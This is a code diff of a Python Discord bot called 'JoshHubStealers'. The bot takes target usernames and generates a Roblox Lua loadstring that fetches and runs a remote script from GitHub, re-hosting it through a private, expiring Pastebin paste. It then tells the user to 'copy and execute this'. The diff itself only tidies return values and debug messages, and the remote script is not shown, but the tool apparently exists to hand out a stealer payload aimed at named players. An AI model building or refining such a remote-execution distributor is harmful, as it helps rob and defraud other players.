@@ -17,8 +17,8 @@ RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubStealer
 def create_pastebin(content):
     try:
         if not PASTEBIN_API_KEY:
-            print("❌ No Pastebin API key!")
-            return None, None
+            print("❌ No Pastebin API key in Secrets!")
+            return None
         
         data = {
             'api_dev_key': PASTEBIN_API_KEY,
@@ -26,23 +26,24 @@ def create_pastebin(content):
             'api_paste_code': content,
             'api_paste_private': '1',
             'api_paste_expire_date': '1D',
-            'api_paste_name': 'MM2 Loadstring'
+            'api_paste_name': 'JoshHub MM2 Loadstring'
         }
         
         response = requests.post('https://pastebin.com/api/api_post.php', data=data)
         print(f"[DEBUG] Pastebin status: {response.status_code}")
-        print(f"[DEBUG] Pastebin response: {response.text}")
+        print(f"[DEBUG] Pastebin response: {response.text.strip()}")
         
         if response.status_code == 200 and 'pastebin.com/' in response.text:
-            paste_url = response.text.strip()
-            paste_id = paste_url.split('/')[-1]
+            paste_id = response.text.strip().split('/')[-1]
             raw_url = f"https://pastebin.com/raw/{paste_id}"
-            return paste_url, raw_url
+            print(f"✅ Pastebin raw URL created: {raw_url}")
+            return raw_url
         else:
-            return None, None
+            print("❌ Pastebin failed")
+            return None
     except Exception as e:
         print(f"[DEBUG] Pastebin error: {e}")
-        return None, None
+        return None
 
 class ScriptModal(Modal, title="JoshHubStealers"):
     usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
@@ -69,16 +70,16 @@ class ScriptModal(Modal, title="JoshHubStealers"):
         github_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
         
         # Try Pastebin
-        paste_url, raw_url = create_pastebin(github_loadstring)
+        raw_url = create_pastebin(github_loadstring)
         
         if raw_url:
             final_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
-            print(f"[DEBUG] Using Pastebin raw: {final_loadstring}")
+            print(f"[DEBUG] Sending Pastebin loadstring: {final_loadstring}")
         else:
             final_loadstring = github_loadstring
-            print(f"[DEBUG] Using GitHub fallback: {final_loadstring}")
+            print(f"[DEBUG] Sending GitHub fallback loadstring: {final_loadstring}")
         
-        # Send FULL loadstring to user
+        # ALWAYS send the full loadstring
         message = f"**🔪 JoshHubStealers – Your Loadstring is Ready!**\n\nCopy and execute this:\n```lua\n{final_loadstring}\n```"
         
         try:
